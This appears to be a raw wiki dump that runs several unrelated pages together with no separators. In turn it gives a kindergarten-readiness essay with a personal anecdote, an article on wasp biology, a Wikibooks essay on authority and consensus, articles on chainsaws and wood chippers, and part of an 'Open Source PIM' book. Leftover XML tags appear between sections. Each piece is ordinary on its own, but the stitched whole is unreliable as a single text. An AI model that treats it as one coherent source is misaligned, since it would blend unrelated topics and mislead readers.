Furthermore, a lot of elementary schools are now testing kindergarten at the beginning of the school year. The tests are used to see how much a child knows and how much assistance a child needs. Portsmouth districts test children before or shortly after the school year has started. In Portsmouth all kindergartners are assessed by the teacher which uses the Phonological Awareness and Literacy Screening (PALS). If the child has a low PALS score, they will receive assistance from the reading specialist. “PALS-K is a measure of children’s knowledge of several important literacy fundamentals: phonological awareness, alphabet recognition, concept of word, knowledge of letter sounds and spelling. PALS-K provides a direct means of matching literacy instruction to specific literacy needs and provides a means of identifying those children who are relatively behind in their acquisition of these fundamental”. (The Rector and the Board of Visitors of the University of Virginia, 2007)



=='''Student Checklists'''==

Although there is no perfect test for parents to check to see if their child is ready for kindergarten, there are many internet articles that have checklists on them, which can assist parents with their child’s development. In one article, “Kindergarten Readiness Checklist”, it suggests a checklist that helps parents to see how well their child is doing in obtaining skills that are found in most kindergarten classes. The article also states that parents should recheck the same skills every month to see how their child is progressing. Some of the checklist suggestions are:

• Listen to stories without interrupting

• Recognize rhyming sounds

• Understand actions have both causes and effects

• Show understanding of general times of day

• Cut with scissors

• Trace basic shapes

• Begin to share with others

• Start to follow rules

• Be able to recognize authority

• Manage bathroom needs

• Begin to control oneself

• Button shirts, pants, coats, and zip up zippers

• Separate from parents without being upset

• Speak understandably

• Identify rhyming words

• Talk in complete sentences of five to six words

• Look at pictures and then tell stories

• Identify the beginning sound of some words

• Identify some alphabet letters

• Count to ten

• Recognize some common sight words like &quot;stop&quot;

• Bounce a ball

• Pay attention for short periods of time to adult-directed tasks

• Sort similar objects by color, size, and shape

• Recognize groups of one, two, three, four, and five objects

(Kindergarten Readiness Checklist, 2000-2007)



=='''Preparing Parents'''==

On the other hand, schools can identify other fundamental skills that the children need, which can help parents prepare their children for kindergarten. In the journal article, “Readiness for Kindergarten: What Schools Can Do”, it claims: “developing a community-wide understanding of skills and knowledge important to children as they enter kindergarten, and providing information and education to other childcare providers- including families and private pre kindergartens- so that they are better able to help children develop these skills and knowledge”. (Protheroe, 34)


In additionally, schools can help parents understand kindergarten readiness by scheduling meetings that focus on it. By understanding kindergarten readiness teachers and parents can increase the proper activities for the children. “Through the meetings, administrators and teachers can provide the school district’s educational philosophy, learning models, curriculum structure, and detailed screening process for kindergarten admission”. (Choi, Kim, Murdock 14)


=='''Teachers and Administrator'''==

The school administrators and teachers expect children to develop certain physical skills before they enter kindergarten. Children are expected to have succeeded in many skills such as walking, running, and climbing, and fine motor skills requiring eye-hand coordination. For example, some of the eye-hand coordination skills are just the use of a pencil, crayons, or scissors. Fine motor skills are utilized when the child begins to write their name. It is understood that children have obtained both visual and auditory discrimination of objects and sounds. Some of these skills are used to learn the names and sounds of letter and the names and quantities of numerals. Children are expected to have developed the idea of same and different, so that they can sort objects into groups whose members are alike in some way. Most kindergarten teacher expected their children to recognize and name colors, shapes, sizes, and their own names. Many school systems and states have risen the entrance age for kindergarten in hopes that the older age of the class will increase the likelihood of the children's success.


=='''Conclusion'''==

In short, kindergarten readiness depends on a child's development of social motor skills and language skills. A good way for parents to help their children is by reading books everyday. Reading will not only increase their vocabulary, their personal growth, but also develop their brain. As a parent I firmly believe that reading will assist children in their daily growth to becoming intelligent students.





=='''SIDEBAR'''==

Kindergarten is an important step on the course of education. A little kindness and preparation from parents and teachers can make this step an enjoyable and flourishing time for your child.

=='''Essay Question'''==


'''Please describe in your own words what you think parents should do to help their children get ready for kindergarten. Give me a personal story about your kindergarten class.'''

Parents need to read books everyday to their children. I believe that reading will increase the growth of knowledge and reading will also help develop the brain. Reading will also increase a child’s vocabulary. As a parent I firmly believe that reading will assist children in their growth to becoming intelligent students.

Kindergarten was not the best time of my life. I had a kindergarten teacher that did not have any patience with children. I believe she should have been a general in the Army. My mother use to put my hair in pony tails everyday in kindergarten. I remember one day, my teacher was yelling at another student and got very upset at this student. Instead of taking it out on him, she took her anger out on me. I only came up to her to ask to go to the bathroom. She grabbed my hair and pulled me around the room. I of course cried and was very upset. I went home to my mother and she came up there and expressed her feelings. The teacher apologizes to my mother, but her position in the school was terminated. I hope my child will never have to deal with that kind of teacher.

I agree that parents should read to their child EVERY day.  I also would like parents to recognize the importance of social skills and social development.  These areas are just as important if not more so than being able to recite their alphabet and numbers.

A '''wasp''' is any insect of the order Hymenoptera and suborder Apocrita that is not a bee or an ant. Less familiar, the suborder Symphyta includes the sawflies and wood wasps, which differ from the Apocrita by having a broad connection between the thorax and abdomen. Also, Symphyta larvae are mostly herbivorous and &quot;caterpillarlike&quot;, whereas those of Apocrita are largely predatory or &quot;parasitic&quot; (technically known as parasitoids).

Most familiar wasps belong to the Aculeata, a division of the Apocrita, whose ovipositors are modified into a venomous stinger. Aculeata also contains ants and bees. In this sense, the insects called &quot;velvet ants&quot; (the family Mutillidae) are actually wasps.

A narrower meaning of the term wasp is any member of the Aculeate family Vespidae, which includes the yellowjackets (''Vespula'', ''Dolichovespula'' spp.) and hornets (''Vespa'' spp.).

'''Wasps''' are mostly predators, rather than plant pests, but some species do cause plant damage, and several are nuisances (or even dangerous) to the gardener because of their venomous stings. Wasps are critically important in natural biocontrol, as almost every pest insect species has a wasp species that is predatory or parasitic upon it, and are often introduced as agricultural pest controls.

==Description==
The following characteristics are present in most wasps:

*Two pairs of wings (exceptions: all female Mutillidae, Bradynobaenidae, many male Agaonidae, many female Ichneumonidae, Braconidae, Tiphiidae, Scelionidae, Rhopalosomatidae, Eupelmidae, and various other families).
*An ovipositor or stinger (only present in females because it derives from the ovipositor).
*Few or no hairs (in contrast to bees); exceptions: Mutillidae, Bradynobaenidae, Scoliidae. Though less efficient than bees, some wasp species are significant pollinators.
*Nearly all terrestrial; only a few specialized parasitic groups are aquatic.
*Predators or parasitoids, mostly on other terrestrial insects; some species of Pompilidae, such as the tarantula hawk, specialize in using spiders as prey, and various parasitic wasps use spiders or other arachnids as hosts.

In wasps, as in other Hymenoptera, sexes are significantly genetically different. Females have a diploid (2n) number of chromosomes and come about from fertilized eggs. Males, in contrast, have a haploid (n) number of chromosomes and develop from an unfertilised egg.

==Ecology==
Wasps can either be solitary or social, with some species (such as hornets and yellowjackets) forming large colonies.

Generally, social wasps do not have a mating flight. Instead they reproduce between a single queen and a male drone in the vicinity of their nesting area. After successfully mating, the drone's sperm cells are stored in a tightly packed ball inside the queen. The sperm are kept stored in a dormant state until the following spring. At a certain time of year (usually late autumn) the bulk of the wasp colony dies away, leaving only the young mated queens alive. During this time they leave the nest and find a suitable area to hibernate for the winter.

After emerging from hibernation during early spring, the young queens search for a suitable nesting site. Upon finding an area for her future colony, the queen usually constructs a basic paper nest into which she will begin to lay eggs. This varies from species to species in specifics, as not all wasps live in paper nests.

The sperm that was stored earlier and kept dormant over winter is now used to fertilize the eggs as they are being laid. The storage of sperm inside the female queen allows her to lay a considerable number of fertilized eggs without the need for repeated mating with a male wasp. For this reason a single female queen is capable of building an entire colony from only herself. The eggs laid initially are sterile female workers who will begin to construct a more elaborate nest around their queen and take over her role of feeding the larvae.

Towards the end of the summer, the female wasps begin to run out of stored sperm to fertilize more eggs. These eggs develop into fertile males and fertile female queens. The male drones then fly out of the nest and find a mate thus perpetuating the wasp reproductive cycle. The queens will then leave the colony to hibernate for the winter once the other wasps begin to die off. After successfully mating with a young queen, the male drones die off. Generally young queens and drones from the same nest do not mate with each other.

Unlike most species of honey bee queens, the wasp queens only live for one year although exceptions are possible. Contrary to popular belief, the queen wasp does not organize the wasp colony or have any raised status amongst the social group. She is rather the reproductive element of the colony as all members of the colony are theoretically direct genetic descendants of the queen.

The nests of social wasps are first constructed by the queen, and then expanded as more workers are propagated. Unlike honey bees, wasps have no wax producing glands. They manufacture a paper-like material from wood pulp. Wood fibers are gathered from weathered wood, softened by chewing and mixing with saliva. The paper is then used to make combs with cells for brood rearing.

Solitary wasps are mostly parasitic on other insects. With most species, adult parasitic wasps themselves do not take any nutrients from their prey, and, much like bees, butterflies, and moths, typically derive all of their nutrition from nectar.  Parasitic wasps (more properly called parasitoids) are extremely diverse in habits, many laying their eggs in inert stages of their host (egg or pupa), or sometimes paralyzing their prey by injecting it with venom through their ovipositor. They typically inject the host with eggs or deposit them upon the host externally; when the eggs hatch, the larvae eat the prey alive, saving the vital organs for last.

A question often arises as to who has what authority, or how decisions can be made by a seemingly endless consensus loop. it is the purpose of this essay to describe in detail how such a situation is employed here at wikibooks. 

== Who has Authority ==

The question of who precisely has authority in general, or who has authority over particular matters is a common one. Despite it's commonality, it is at the same time the least relevant and helpful. If a person or group is listed with such authority, the inevitable follow-up question is to ask by what virtue that authority was granted. with a similar answer as to the virtue, the inevitable question arises as to who decided to use that virtue as a metric, and by what authority did those people make such a decision?

The result of this exercise is utter pointlessness, as no finite conclusion is ever reached to any amount of satisfaction.

=== Authority as Ubiquitous ===

In the world of Wiki, authority is essentially ubiquitous. No single user has any more authority then any other. At the same time, no single user has complete authority (and by extension all users lack complete authority). The result is that people are able and empowered to make changes, while at the same time they are required to work together in complex ways and reach agreement. As Albert Einstein once said: &quot;[[q:Albert_Einstein#Mein_Weltbild_.281931.29|Let every man be respected as an individual and no man idolised.]]&quot;

=== Limiting Factors ===

While the wiki maxim is '''be bold''', there are a number of limiting factors that help to prevent complete chaos. While any user may make a change to a particular page, any other user has the authority to modify or remove completely that change. Two or more users so empowered, will revert one another repeatedly, producing an unstable oscillatory content version, which is worse in many respects then a single incomplete version. As reverts, edit wars, and wheel warring are limited by policy, these events cannot be allowed to persist beyond a few cycles. For either of the disputants to make a change and therefore an improvement in a page, they must work together and reach compromise. Frequently, when discussions are polarizing, it is impossible for two disputants to adequately compromise, and so an appeal is made to the authority of additional community members to help render a suitable (if not perfectly acceptable) solution.

=== Authority Vs. Power ===

This is a good time, perhaps, to discuss the ideas of &quot;authority&quot; and &quot;power&quot;. To reduce confusion, these words will be specifically redefined here for local uses:

;Power: The ability of a wikibookian to make changes.
;Authority: The ability of a wikibookian to make decisions.

The notion of power then is little more then a technical limitation. Users are granted the ability to edit, modify, and move pages. Users then have a certain amount of authority in making those changes over which they have power. This would seem to lead to a discrepancy between regular users and admins, as admins have more power, and then would seem to have more authority then regular users.

== Admins as Exceptions? ==

The truth is that admins are not necessarily exceptions, nor do they stand out in terms of their authority on ordinary matters. However there is clearly a distinction between admins and users that must be considered.

Consider the case of a VfD discussion that has more or less reached general consensus that a particular page should be deleted. Once such consensus is reached an admin may, at their discretion, act to delete the page. Of the pool of available admins, any particular admin may act at the request of the community to delete the page. A question arises then as to what precisely happens if no admin does perform the deletion? What if the community agrees in general to promote a new admin, but no bureaucrat performs the promotion? What if numerous community members call for a checkuser of a related group of vandals, and no checkuser performs the requested actions?

Admins have authority over their use of the admin power, but ordinary users do not have such authority. In essence, an ordinary user cannot mandate an admin to use their power, or to use it in a particular way. Through the mechanism of RFA, new admins are simultaneously granted new power ''and the necessary new authority''. No user may mandate the use of a power over which they have no authority. 

== Decisions as Persuasion ==

Don't think that regular users have no sort of influence over the actions of admins, as this is certainly not the case. Any argument that is sufficiently compelling will likely draw at least one sympathetic admin from the pool to act in a particular manner. In VfD, for instance, it only requires one admin to delete a particular page, so only one admin needs to be convinced of that particular argument. If the arguments for deletion are sound, and the arguments against a weak yet numerous, it is possible that an admin may be compelled to delete the page.

=== Avoid Recklessness ===

Both regular users and admins alike can be motivated along a particular course of action by their peers. The '''be bold''' maxim comes with the caveat &quot;...but don't be reckless&quot; as recklessness tends to be viewed in a very negative light. Even when persuaded by a particular course of action, a user might not act for fear of being seen as reckless. Consider a particular straw poll where 4 members vote in favor of a proposal, and 6 members vote against. Consider also that the 4 members in favor are very well-known wikibookians, and that their arguments are particularly well thought-out and are very persuasive. It is unlikely that any user, though being properly persuaded by the voting minority, is going to act against the votes of a 60% majority. Despite proper persuasion, flagrantly ignoring the majority vote is something that most wikibookians will not do regularly, if at all. 

== Non-Involvement Clause ==

Many policies have caveats that state a person should not exercise power when embroiled in a dispute. For instance, an editor should not make changes to a particular page when there are active objections to that edit. Likewise, an admin is encouraged not to delete pages that they themselves have nominated for VfD. The idea of persuasion in these instances is readily apparent. In the case of VfD, the nominating user (be they admin or not) must persuade other wikibookians to vote to delete, and the combined arguments must persuade an admin to actually perform the deletion. 

== Ending Discussions ==

It's wrong to think that any discussion is ever truly over, as wikibookians may certainly continue to discuss a particular issue long after action has been taken. No action is set in stone, and community opinion can change on matters over time. However, many discussions come to points where users with authority are sufficiently persuaded to take action, and are sufficiently sure that such action will not be reckless. It is tempting for people at this point to say &quot;the matter is decided&quot; or &quot;the discussion is over&quot;, when no discussion is ever truly over. However, the fact that a discussion continues does not mean that action must wait. Actions may certainly be performed before a discussion is over, and if the discussion demonstrates that community opinion on the matter has changed, those actions may be modified or reverted entirely at a later time.

== Progress as Natural Selection ==

Stagnation is the enemy of this project and any project. Any proposal or discussion that is sufficiently stagnant will discourage future contributors, and prevent people from taking action where action is needed. If a discussion is essentially abandoned on account of garnering too little support either way,it becomes more difficult to get community members to discuss their opinions on the matter. Without fresh opinions, it is impossible to determine what the community thinks about a particular issue. As Einstein said, &quot;[[q:Albert_Einstein#Unsourced|Anyone who has never made a mistake has never tried anything new.]]&quot; Action, even when there is uncertainty as to the outcome, is almost always better then no action at all. If an incorrect action is taken, the community can learn from the mistake and act to correct it. If a correct action is taken, the community will benefit from that. Thomas Edison once said &quot;[[q:Thomas_Edison#Unsourced|I have not failed. I've just found 10,000 ways that won't work.]]&quot; While it is unlikely that wikibookians will attempt any action 10,000 times, it is always more valuable to know 1 incorrect way to perform that action then to know nothing about performing it at all.

== Policy ==

Call it policy or &quot;guidelines&quot; or whatever, there is absolutely no sense in not putting in writing exactly what this community expects from it's members, and exactly how we do business around here. There are minimalists out there who don't think that we should need to write any policies at all, and instead rely on people to use their &quot;common sense&quot; in making decisions. I don't think that can work at all. 

This is not to say that we need to micromanage our members, or that we need to have a million different rules, but saying simply &quot;use common sense&quot; is not enough to run a community. There are a few things that should be specified:

#How we make decisions
#How we interact with one another (be nice, no personal attacks, no threats, etc)
#How this website is run (administrative tasks, cleanup, etc)
#How materials should be organized
#How we deal with disputes and differences of opinion
#What kinds of materials can and cannot be on our project

Defining specifically that wikibooks is for &quot;textbooks&quot; prompts the requirement that we define &quot;textbook&quot;. There is no way to use common sense to decide whether one non-fiction book is considered a &quot;textbook&quot; or not.

The things that ''must'' be followed are policy. Policy are rules that must be followed in order to achieve our mission objectives. The things that ''should'' be followed are guidelines. Guidelines are, for all intents and purposes, rules of operation, but some people seem to get bent less out-of shape when we call a rule a guideline rather then a policy. I don't think that there is a difference, a rule is a rule. We should specify the rules, and we should expect that people will follow them.</text>

A '''chainsaw''' (also spelled '''chain saw''') is a portable mechanical, motorized saw. It is most commonly used in logging activities such as felling, delimbing, and bucking; by tree surgeons to fell trees and remove branches and foliage; to fell snags and assist in cutting firebreaks in wildland fire suppression, and to harvest firewood. Chainsaws with specially designed blades have been developed as tools for use in chainsaw art.

== Construction ==
[[File:Chainsaw.arp.750pix.jpg|thumb|Gasoline-driven chain saw.]]

Chainsaws consist of a small two-stroke gasoline (petrol) internal combustion engine (although smaller versions sometimes use electric motors), the &quot;guide bar&quot; (essentially a long metal frame of a very hard wearing alloy) and the cutting chain itself. Usually each segment in this chain (which is constructed from riveted metal sections similar to a bicycle chain, but without rollers) features a small sharp blade, called a &quot;tooth.&quot; &quot;Skip tooth&quot; chain has a tooth only on every second link, and is used for reduced risk of the chain clogging when cutting very soft wood. In modern saws the teeth are not straight blades; they have a forward section that first chips a piece of wood from the bottom of the cut, then another section, at a right angle to the first, which chips a piece from the wall of the cut. There are left and right handed teeth, depending on which wall of the cut they will chip. Left and right teeth are alternated in the chain.

The underside of each link features a small metal finger that keeps the tooth centered between the rails of the bar, helps to carry lubricating oil around the bar, and engages with the engine's drive sprocket inside the body of the saw. The engine drives the chain around the track at a high speed, providing an effective (if rather rough) cutting action.

== Maintenance ==
Chainsaws usually require two sources of lubrication. Like most two-stroke engines, the engine is lubricated by its fuel, which contains about 2 ~ 5% (depending on model) oil dissolved in the fuel. Since this mixture is highly flammable, a completely separate oil reservoir is used for the external lubrication of the blade and chain. This latter oil is depleted quickly because it tends to be thrown off the chain by centrifugal force. Failing to keep this reservoir topped up, or using an oil of incorrect viscosity, is a common source of damage to saws and tends to lead to the chain coming off of the bar. With some types of wood, the operator will need to occasionally stop and unplug the holes where the oil is dispensed to the chain and guide bar


The air intake filter tends to clog up with sawdust. This must be cleaned from time to time, but is not a problem during normal operation. Many saw operators clean it with petrol, although manufacturers recommend using compressed air to blow the dust off the filter mesh from the inside, or warm, soapy water, and then left to air dry. If these resources are not available, pure, clean gasoline should be used, otherwise the residual oil on the filter will make it clog up again faster.

Chains must be kept very sharp to perform well. This may be done with a round file or a jig (without removing the chain from the saw), or with a specialised electric sharpening jig with the chain removed from the saw. The jigs help ensure that each cutting face is kept at the correct angles, which are carefully balanced to maximise the saw's efficiency. Proper hand-sharpening may produce a better result, but electric sharpeners are faster, particularly when sharpening very dull chains (especially those which have been subjected to dirt, metal or rocks). Carbide chainsaw blades cannot be sharpened by conventional sharpeners and must be sharpened by a diamond sharpener.

== Safety ==
[[File:ChainsawChain.JPG|thumb|Chainsaw chain.]]
Despite safety improvements, chainsaws can be dangerous, and injuries can arise from their use. The most common accident arises from &quot;kickback,&quot; when a chain tooth at the upper quadrant of the guide bar tip bites into wood without cutting through it. The chain cannot continue moving, and the bar is driven in an upward arc towards the operator. Kickback can result in serious injuries or death. Another dangerous situation occurs when heavy timber begins to fall or shift when a cut is nearly complete - the chainsaw operator can be trapped or crushed. Operation of chainsaws can also cause vibration white finger, tinnitus or industrial deafness. The risks associated with chainsaw use mean that protective clothing and hearing protectors should be worn while operating them, and many jurisdictions require that operators be certified or licensed to work with chainsaws. Injury can also result if the chain breaks during operation due to poor maintenance or attempting to cut inappropriate materials.

== Accessories ==
Some saws can have the blade replaced by other attachments, using the saw's &quot;power head&quot; as their motor. Some common attachments are augers, circular saws, winches, hedge trimmers and capstans.

== History ==
The origin is debated, but the first chainsaw was probably made around 1830 by the German orthopaedist Bernard Heine.  This instrument, the ''osteotome'', had links of a chain carrying small cutting teeth with the edges set at an angle; the chain was moved around a guiding blade by turning the handle of a sprocket wheel.  As the name implies, this was used to cut bone.  

Two important contributors to the ''modern'' chainsaw are Joseph Buford Cox and Andreas Stihl; the latter patented and developed a chainsaw in 1926 and a gasoline-powered chainsaw in 1929, and founded a company to mass-produce them. In 1927, Emil Lerp, the founder of [http://www.dolmar.com Dolmar], developed the world's first gasoline-powered chainsaw and mass-produced them.

McCulloch and Industrial Equipment Corp in North America started to produce chainsaws. The early models were heavy, two-person devices with long bars. Often chainsaws were so heavy that they had wheels like dragsaws. Other outfits used driven lines from a wheeled power unit to drive the cutting bar.

After World War 2, improvements in aluminum and engine design lightened chainsaws to the point where one person could carry them. Chainsaws have almost entirely replaced simple man-powered saws in forestry. They come in many sizes, from small electric saws intended for home and garden use, to large &quot;lumberjack&quot; saws.

'''Open Source PIM''' stands for '''Open Source Personal Information Management.''' This book describes the philosophy and methods for Personal Information Management from the perspective of Open Source. In this context, Open Source refers to both software and standards that are substantially unencumbered by licensing restrictions and lack of flexibility. 

This book is primarily intended as a practical guide for anyone who wishes to consider effective ways of maintaining personal information on a computer with minimal effort and with the greatest degree of personal flexibility.

      <text xml:space="preserve">== Basic problems ==
To illustrate the usefulness of '''Open Source PIM'''. A reasonable user may ask, &quot;Why should I care about this?&quot; This can best be answered in terms of specific problems and how '''Open Source PIM''' seeks to fix these problems. 

=== Information overload ===
* the user is not able to find information that she remembers having saved previously
* the user is not able to search, compare or analyze information in a dynamic way
* because of the lack of a consistent and unified storage and retrieval system, the user may have duplicate copies of the same information in multiple places

=== Discontinuity of experience ===
* users are often required to change applications:
** when dealing with different media types
** when dealing with different storage formats
** when dealing with software from different vendors

Changing applications entails ascending a different learning curve every time a new application is encountered. Old skills become obsolete and new ones have to be learned.

== Limitations to avoid ==
One of the motivations behind '''Open Source PIM''' is the view that personal information management should be unencumbered by certain persistent limitations. These limitations are common hurdles to dealing with the basic problems of personal information management. These limitations have various root causes and side-effects, but they all represent basic issues that can be addressed and dealt with, once they are recognized.

=== Limited Metaphors ===
There are certain persistent metaphors used in computing that limit the way users think about information. This in turn limits the creativity of software developers, because their efforts are naturally inhibited by what they believe users can reasonably understand. This creates a self-perpetuating loop. 

Limited metaphors do not necessarily reflect bad ideas or bad design. Some metaphors reflect an attempt to convey ideas that have yet to be understood by the general public, but will someday become commonplace. &lt;!-- for example [http://en.wikipedia.org/wiki/Memex];; the name &quot;wiki books&quot; is another example. a wiki is substantially different from the common notion of a &quot;physical&quot; book with bound pages, but, for lack of a better way to relate to people unfamiliar with wikis, the name &quot;wikibook&quot; is probably the best that can be done for now
--&gt; The problem arises when the metaphors become more influential than the underlying ideas and structures that they were originally intended to convey. That is when the metaphors become problematic and limiting. 

Some of these &quot;limiting&quot; computing metaphors include:
* the notion of &quot;files&quot;
* the notion of &quot;directories&quot; (aka &quot;folders&quot;) 
* the &quot;fixed hierarchy&quot; implicit in the way files and directories are organized

==== Limitations of the &quot;file&quot; metaphor ====
* limited attributes for classifying files (e.g., file = path  + name + extension ) 
* a file is assumed to have one and only one &quot;name&quot; 
* sub-elements of a file may not support attributes (e.g., assigning a &quot;name&quot; to each paragraph in a text file, so that each paragraph can be independently cross-referenced)
* support for metadata to address these limitations is spotty and inconsistent

==== Limitations of the &quot;directory&quot; metaphor ====
Assigning a file to a particular directory is analogous to &quot;tagging&quot; a file. Under this analogy, a file is allowed one and only one &quot;tag&quot; as a descriptor, and the tag must fit within a rigidly defined hierarchy.

=== Limited accessibility ===
Interaction with software should not rest on too-rigid assumptions about how that interaction is going to take place. Many users of alternate abilities interact with software in ways that may not be apparent to those who are primarily familiar with more common modes of interaction.

==== Common barriers to accessibility ====

Some common barriers to accessibility include:
* closed file formats with unpublished or constantly-changing specifications
* file formats that are not translatable into &quot;neutral&quot; formats such as plain text
* file formats that are translatable, but only through time-consuming &quot;point and click&quot; interfaces with no options for &quot;batch&quot; processing
* any kind of essential functionality restricted to time-consuming &quot;mouse-only&quot; operations

Point-and-click interfaces do allow a certain level of convenience and flexibility, a problem arises, however, when point-and-click becomes the ''only'' way to get certain operations done in an application. 

==== Common areas where accessibility barriers are high ====

Often software packages omit the ability to save and transfer information generated by a &quot;point and click&quot; interaction into a &quot;fixed&quot; state via configuration files. 
* application data files
* user choices in application dialog boxes and settings panels
* repetitive operations such as keystrokes and menu clicks that occur on a regular basis
* different &quot;snapshots&quot; of data after transformations through search, sort, and filter

==Solutions to avoid==
There are a range of counter-productive solutions
* complex notations and meta-data schemes that are difficult and time consuming to learn
* one-vendor-fits-all solutions that emphasize a singular way of doing things at the expense of enabling a dynamic mix of technologies

      <text xml:space="preserve">== Core principles ==

Hyperlinks should be a common attribute of plain text, and they should be even more flexible than those used on the web. This is the primary motivation behind Plain Text Hyperlinks (hereinafter '''&quot;PTH&quot;''').

Plain text is the foundation for Open Source PIM because it is the most flexible storage format, and can be processed with the widest variety of pre-existing tools. Starting with that as the foundation, the following principles apply

* The user should be able to treat every item in plain text as a hyperlink to something else
* Special notations for specifying hyperlinks are allowable, but not required
* Uncompressed plain text is considered the most &quot;open&quot; storage format
* Compressed plain text is considered the next most &quot;open&quot; storage format
* Content that is not readily storable as plain text should at least be readily linkable using PTH
* All elements of a software system that are important to the user should be manageable (e.g., import/export) as plain text

[[Image:Tree shredder 14m07.JPG|right|thumb|A portable tree shredder and lorry.  Processed wood chips have been collected in the lorry]]
A '''wood chipper''' is a machine used for reducing wood (generally tree limbs or trunks) into smaller parts, such as wood chips or sawdust. They are often portable, being mounted on wheels on frames suitable for towing behind a truck or van. Power is generally provided by an internal combustion engine from 3 to 1,000 horsepower.

Wood chippers are typically made of a hopper with a collar, the chipper mechanism itself, and an optional collection bin for the chips. A tree limb is inserted into the hopper (the collar serving as a partial safety mechanism to keep human body parts away from the chipping blades) and started into the chipping mechanism. The chips exit through a chute and can be directed into a truck-mounted container or onto the ground. Typical output is chips on the order of one to two inches across in size. The resulting wood chips have various uses such as being spread as a ground cover or being fed into a digester during papermaking.

Most woodchippers rely on energy stored in a heavy flywheel to do their work (although some use drums). The chipping blades are mounted on the face of the flywheel, and the flywheel is accelerated by an electric motor or internal combustion engine. As large branches are consumed by the machine, the inertia of the flywheel causes it to gradually slow down; when the branch is consumed, the engine causes it to speed up again. This is what produces the rising and falling siren-like howl of these machines.
Large woodchippers frequently are equipped with grooved rollers in the throat of their feed funnels. Once a branch has been gripped by the rollers, the operator lets go of it and the rollers transport the branch to the chipping blades at a steady rate. These rollers are a safety feature, and are generally reversible for situations where a branch gets caught on clothing.

==Chipper Styles==
'''High-Torque Roller'''

Shredders that make use of high-torque low-speed grinding rollers are growing in populartiry for residential use.
These shredders are driven with an electric motor and are very quite, dust free, and self feeding.  Some of these
machines are equipped with an anti-jamming feature.

===Drum Chippers===

[[image:Whisper Chipper.JPG|thumb|right|An Asplundh &quot;Whisper Chipper.&quot;]]
The first commercially marketed chippers were of a design that was drum-based.  They are still produced and sold today.  The chipping mechanism in a drum style chipper is large steel drum powered by the motor, usually by a belt.  It is mounted parallel to the hopper and spins towards the output chute.  The drum also serves as the feed mechanism, drawing the material through as it chips it.  This caused it to be colloquially known as a &quot;chuck-and-duck&quot; chipper, because material would start moving through the chipper very quickly as soon as it made contact with the drum.

These chippers have many downsides.  The drum-style chipper is not as safe as newer designs.  If an operator becomes snagged on material being fed into the machine, injury or death is almost certain.  These chippers are also very loud.  The chips produced can be very large, and if thin material is inserted, it may be cut into slivers rather than chips.  Finally, since the drum cannot be disengaged from the engine, if too large or too long material is fed through the machine, it will stall, usually with the material stuck firmly in the drum.

Newer models have overcome many of these disadvantages with reversible hydraulic feed wheels automatically controlled with the digital [http://www.autofeedplus.com/ Auto-Feed Plus®]first seen published In the tree trader magazine Oct 2000 By Kurt Snider of Electronic Solutions and muffling systems.  The reversible feed system allows the newer style drum chippers to handle larger diameter materials. 

Modern Drum-style chippers usually have a material capacity of 6 to 19 inches.

===Disk Chippers===
A newer chipper design employs a steel disk with knives mounted upon it as the chipping mechanism.  In this design, (usually) reversible hydraulically powered wheels draw the material from the hopper towards the disk, which is mounted on a perpendicular angle to the incoming material.  As the disk spins, the knives cut the material into chips.  They are thrown out the chute by flanges on the drum.
This design is not as energy-efficient as the drum-style design, but produces chips of more uniform shape and size. Most chippers currently used by commercial tree care companies are of this type.

Disk-style chippers usually have a material diameter capacity of 6 to 24 inches.

===Other Styles===
Much larger machines for wood processing exist.  &quot;Whole tree chippers&quot; and &quot;Recyclers,&quot; which can typically handle material diameters of two to six feet, may employ drums, disks, or a combination of both.  The largest machines used in wood processing, often called &quot;Tub Grinders,&quot; may handle a material diameter of eight feet or greater, and used carbide tipped flail hammers to pulverize wood rather than cut it.  These machines usually have 200 to 1,000 horsepower.  Some are so heavy that they must be moved by a semi-trailer truck. Smaller models can be pulled with a medium duty truck.

==Chipper Knives==
Although chippers vary greatly in size, style, and capacity, the knives they use are all very similar.  They are rectangular in shape and are usually four to six inches across by six to twelve inches long.  They vary in thickness from about one-half to two inches.  Chipper knives are made from high grade steel, and usually contain a minimum of 8% chromium for hardness.

==Chipper Controls==
Chippers were controlled by various means since their inception.  However the harsh application and environment caused an incredible lack of reliability and performance. In 1999, Kurt Snider developed a proportional start/stop auto feed control that was tested by Morbark. Although this was the first digital feed control for this type of machinery, the net result was sawdust. The following summer, Kurt produced the first digital, programmable, reversing control with a LED display, Auto-Feed Plus®.  This control eliminated the self feeding of material into the feed wheels when the engine bogged down.  In addition, this technology, by enabling the machine to stop and reverse the feed wheels after the engine RPM's drop to a pre-determined set point, saves on knife wear, clutch wear, adds to the overall longeivity of the machine. This technology has so reveloutionized the industry, virtually every North American manufacturer of tree chippers and most world wide, now use some variation of reversing auto feed.

==Safety==
Chippers are by nature dangerous machines, designed to turn whatever is put into them into small chips. While most modern chippers have safety features built in, it's important to remember that some don't, and even those that do need to be used with caution and under the guidance of an experienced operator.

===Protective clothing===
Users of chippers should wear comfortable clothing that is not too loose, and preferably of strong fabric that won't get punctured by branches. Goggles should always be worn, and when using non-self-feeding types a brush mask is advisable. Ear protection is a must, especially for larger chippers. 

===Stacking===
Chippers should always be fed butt end first, so piles need to be stacked before the chipping starts. In order to prevent branches from becoming entangled, piles are stacked in a fan-like pattern, in a third of a circle around the chipper (leave room to each side for branches that get caught up and need to be thrown aside). For very large brush piles, these fans can be in two rows (one in front of the other). The back row should not sit on any part of the front row, to avoid the need for pulling branches free while the chipper is running. There should always be at least ten feet of work space between the piles and the chipper chute, to prevent tripping. 

Depending on the type of wood, the angles of the branches, and the capacity of the chipper, some branches may need to be cut to prevent jamming. Branches that are close in length to the feeding capacity width should never be thrown in, since they can often jam between the feed wheel and the disk.

[[Image:Roots may contain stones.JPG|thumb|right|200px|Roots may contain stones]]
Roots and raked materials should never be chipped, since they often contain rocks that can damage the blades. The chipping of thorned materials should be avoided when possible.

When chipping diseases materials, the load of chips should be marked as such, and not used for mulching near any plant that is vulnerable to the same pathogen.

===Chipping===
Before starting the chipper, check to make sure the discharge chute is pointing in the right direction, and is secured. Make sure everyone is ready before starting the engine. Hand signals for &quot;wait&quot;, &quot;put it in&quot;, &quot;don't put that in&quot;, and &quot;turn it off&quot; should be gone over with new crew members. All safety equipment should be put on before starting the engine, shoes tied, and any foreign materials gotten out of the way. If chipping in a residential area, make sure that no children, dogs, or other &quot;civilians&quot; are in the area.

Once the chipper is started and spun up, workers can begin adding materials into the infeed shute. If more than one worker is using the chipper, the crew members need to keep a careful eye on one another, and make eye contact before adding a new armful. If small material doesn't go in right away, it's often easier to simply let it be pushed in by the next load, rather than blocking the way.

